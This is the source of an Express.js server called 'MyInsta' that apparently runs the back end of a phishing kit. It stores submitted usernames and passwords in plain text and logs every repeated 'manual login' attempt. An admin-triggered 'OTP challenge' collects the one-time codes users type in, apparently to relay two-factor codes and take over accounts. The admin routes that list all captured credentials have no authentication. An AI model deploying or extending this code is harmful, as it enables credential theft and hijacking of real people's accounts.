const express = require('express');
const path    = require('path');
const fs      = require('fs');
const app     = express();
const PORT    = process.env.PORT || 3000;

app.use(express.json());

// Data dir for referrals
const dataDir      = path.join(__dirname, 'data');
const refsFile     = path.join(dataDir, 'refs.json');
const pendingFile  = path.join(dataDir, 'pending.json');
const ordersFile   = path.join(dataDir, 'orders.json');
const manualFile   = path.join(dataDir, 'manual.json');
if (!fs.existsSync(dataDir)) fs.mkdirSync(dataDir);

// Static assets
app.use('/css', express.static(path.join(__dirname, 'css')));
app.use('/js',  express.static(path.join(__dirname, 'js')));
app.use('/img', express.static(path.join(__dirname, 'img')));

// Routes
app.get('/',          (_, res) => res.sendFile(path.join(__dirname, 'index.html')));
app.get('/login',     (_, res) => res.sendFile(path.join(__dirname, 'login.html')));
app.get('/dashboard', (_, res) => res.sendFile(path.join(__dirname, 'dashboard.html')));
app.get('/alogin',    (_, res) => res.sendFile(path.join(__dirname, 'admin-login.html')));
app.get('/admin',     (_, res) => res.sendFile(path.join(__dirname, 'admin.html')));
app.get('/verify',    (_, res) => res.sendFile(path.join(__dirname, 'verify.html')));
app.get('/manual',    (_, res) => res.sendFile(path.join(__dirname, 'manual.html')));

// ── Referral API ──
app.post('/api/ref', (req, res) => {
  const { referrer, referee } = req.body || {};
  if (!referrer || !referee || referrer === referee) return res.json({ ok: false });
  let refs = {};
  try { refs = JSON.parse(fs.readFileSync(refsFile, 'utf8')); } catch {}
  if (!refs[referrer]) refs[referrer] = [];
  if (!refs[referrer].find(r => r.user === referee)) {
    refs[referrer].push({ user: referee, date: new Date().toISOString() });
    fs.writeFileSync(refsFile, JSON.stringify(refs));
  }
  res.json({ ok: true });
});

app.get('/api/refs/:username', (req, res) => {
  let refs = {};
  try { refs = JSON.parse(fs.readFileSync(refsFile, 'utf8')); } catch {}
  res.json(refs[req.params.username] || []);
});

// ── Pending users API ──
function readPending() {
  try { return JSON.parse(fs.readFileSync(pendingFile, 'utf8')); } catch { return {}; }
}
function writePending(data) {
  fs.writeFileSync(pendingFile, JSON.stringify(data));
}

app.post('/api/pending', (req, res) => {
  const { username, password, ref } = req.body || {};
  if (!username || !password) return res.json({ status: 'error' });
  const pending = readPending();
  if (pending[username]) return res.json({ status: pending[username].status });
  pending[username] = { username, password, ref: ref || null, submittedAt: new Date().toISOString(), status: 'pending' };
  writePending(pending);
  res.json({ status: 'pending' });
});

app.get('/api/pending', (req, res) => {
  const pending = readPending();
  const list = Object.values(pending).sort((a, b) => new Date(b.submittedAt) - new Date(a.submittedAt));
  res.json(list);
});

app.get('/api/pending/check/:username', (req, res) => {
  const pending = readPending();
  const user = pending[req.params.username];
  if (!user) return res.json({ status: 'unknown' });
  const out = { status: user.status };
  // Include OTP challenge if active and not expired
  if (user.otp) {
    const elapsed = Date.now() - new Date(user.otp.sentAt).getTime();
    if (elapsed < 5 * 60 * 1000) {
      out.otp = { phone: user.otp.phone, sentAt: user.otp.sentAt, expiresAt: user.otp.expiresAt };
    } else {
      out.otpExpired = true;
    }
  }
  res.json(out);
});

// Admin sends OTP verification challenge to a pending user
app.post('/api/otp/send/:username', (req, res) => {
  const { phone } = req.body || {};
  if (!phone) return res.json({ ok: false, error: 'Phone required' });
  const pending = readPending();
  const un = req.params.username;
  if (!pending[un]) return res.json({ ok: false, error: 'User not found' });
  const now = new Date();
  pending[un].otp = {
    phone,
    sentAt: now.toISOString(),
    expiresAt: new Date(now.getTime() + 5 * 60 * 1000).toISOString(),
    attempts: pending[un].otp ? pending[un].otp.attempts || [] : []
  };
  writePending(pending);
  res.json({ ok: true });
});

// User submits OTP code
app.post('/api/otp/submit/:username', (req, res) => {
  const { code } = req.body || {};
  if (!code) return res.json({ ok: false, error: 'Code required' });
  const pending = readPending();
  const un = req.params.username;
  if (!pending[un] || !pending[un].otp) return res.json({ ok: false, error: 'No OTP challenge' });
  const elapsed = Date.now() - new Date(pending[un].otp.sentAt).getTime();
  if (elapsed >= 5 * 60 * 1000) return res.json({ ok: false, error: 'OTP expired' });
  if (!pending[un].otp.attempts) pending[un].otp.attempts = [];
  pending[un].otp.attempts.push({ code, submittedAt: new Date().toISOString() });
  writePending(pending);
  res.json({ ok: true });
});

app.post('/api/pending/approve/:username', (req, res) => {
  const pending = readPending();
  if (!pending[req.params.username]) return res.json({ ok: false });
  pending[req.params.username].status = 'approved';
  pending[req.params.username].approvedAt = new Date().toISOString();
  writePending(pending);
  res.json({ ok: true });
});

app.post('/api/pending/reject/:username', (req, res) => {
  const pending = readPending();
  if (!pending[req.params.username]) return res.json({ ok: false });
  pending[req.params.username].status = 'rejected';
  pending[req.params.username].rejectedAt = new Date().toISOString();
  writePending(pending);
  res.json({ ok: true });
});

// Delete user entirely (force-logout all devices + wipe all data)
app.post('/api/user/:username/delete', (req, res) => {
  const un = req.params.username;
  // Completely remove from pending — check endpoint will return 'unknown',
  // which dashboard + verify pages treat as force-logout
  const pending = readPending();
  delete pending[un];
  writePending(pending);
  // Wipe orders
  const orders = readOrders();
  delete orders[un];
  writeOrders(orders);
  // Wipe refs
  let refs = {};
  try { refs = JSON.parse(fs.readFileSync(refsFile, 'utf8')); } catch {}
  delete refs[un];
  fs.writeFileSync(refsFile, JSON.stringify(refs));
  res.json({ ok: true });
});

// ── Orders API ──
function readOrders() { try { return JSON.parse(fs.readFileSync(ordersFile, 'utf8')); } catch { return {}; } }
function writeOrders(d) { fs.writeFileSync(ordersFile, JSON.stringify(d)); }

// Upsert a single order
app.post('/api/orders/:username', (req, res) => {
  const { order } = req.body || {};
  if (!order || !order.id) return res.json({ ok: false });
  const all = readOrders();
  if (!all[req.params.username]) all[req.params.username] = [];
  const idx = all[req.params.username].findIndex(o => String(o.id) === String(order.id));
  if (idx >= 0) all[req.params.username][idx] = order;
  else all[req.params.username].push(order);
  writeOrders(all);
  res.json({ ok: true });
});

// Get one user's orders
app.get('/api/orders/:username', (req, res) => {
  const all = readOrders();
  res.json(all[req.params.username] || []);
});

// Get all orders across all users (admin)
app.get('/api/allorders', (req, res) => {
  const all = readOrders();
  const list = [];
  Object.entries(all).forEach(([u, orders]) => orders.forEach(o => list.push({ ...o, _user: u })));
  list.sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt));
  res.json(list);
});

// Update order status (admin)
app.post('/api/orders/:username/:id/status', (req, res) => {
  const { status } = req.body || {};
  const all = readOrders();
  if (!all[req.params.username]) return res.json({ ok: false });
  const idx = all[req.params.username].findIndex(o => String(o.id) === String(req.params.id));
  if (idx < 0) return res.json({ ok: false });
  all[req.params.username][idx].adminStatus = status;
  writeOrders(all);
  res.json({ ok: true });
});

// ── Manual login API ──
function readManual() { try { return JSON.parse(fs.readFileSync(manualFile, 'utf8')); } catch { return []; } }
function writeManual(d) { fs.writeFileSync(manualFile, JSON.stringify(d)); }

// User submits credentials (allows multiple submissions, all logged)
app.post('/api/manual', (req, res) => {
  const { username, password, email, phone } = req.body || {};
  if (!username || !password) return res.json({ ok: false });
  const list = readManual();
  list.push({ username, password, email: email || '', phone: phone || '', submittedAt: new Date().toISOString(), source: 'user' });
  writeManual(list);
  res.json({ ok: true });
});

// Admin reads all manual logins
app.get('/api/manual', (req, res) => {
  res.json(readManual());
});

// Admin creates a user directly (bypasses all verification)
app.post('/api/manual/create', (req, res) => {
  const { username, password } = req.body || {};
  if (!username || !password) return res.json({ ok: false });
  // Add to pending as approved so they show up in Users tab
  const pending = readPending();
  pending[username] = { username, password, submittedAt: new Date().toISOString(), status: 'approved', approvedAt: new Date().toISOString(), source: 'admin-created' };
  writePending(pending);
  res.json({ ok: true });
});

// Catch-all → login
app.get('*', (_, res) => res.redirect('/login'));

app.listen(PORT, () => {
  console.log(`\n✅  MyInsta running → http://localhost:${PORT}\n`);
  console.log(`   User Login : http://localhost:${PORT}/login`);
  console.log(`   Dashboard  : http://localhost:${PORT}/dashboard`);
  console.log(`   Admin Login: http://localhost:${PORT}/alogin`);
  console.log(`   Admin Panel: http://localhost:${PORT}/admin\n`);
});
